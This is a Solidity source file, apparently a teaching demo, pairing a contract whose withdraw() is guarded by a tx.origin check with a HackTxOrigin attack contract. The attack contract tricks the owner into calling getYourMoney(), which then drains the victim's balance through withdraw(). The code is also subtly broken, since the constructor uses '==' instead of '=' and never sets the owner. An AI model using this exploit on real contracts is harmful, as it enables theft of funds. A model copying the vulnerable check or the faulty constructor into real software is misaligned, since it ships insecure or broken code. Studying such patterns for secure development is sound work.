// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackAuctionTxOrigin {
    address _owner;
    modifier onlyOwner() {
        require(tx.origin  == _owner, "not an owner!"); //Do not use tx.origin 
        _;
    }

    constructor() payable {
        _owner == msg.sender;
    }

    function withdraw(address _to) external onlyOwner {
        (bool ok, ) = _to.call{value: address(this).balance}("");
        require(ok, "can't send");
    }

    receive() external payable {}
}

contract HackTxOrigin {
    AttackAuctionTxOrigin toHack;

    constructor(address payable _toHack) payable {
        toHack = AttackAuctionTxOrigin(_toHack);
    }
    function getYourMoney() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "can't send");

        toHack.withdraw(address(this));
    }

    receive() external payable {}
}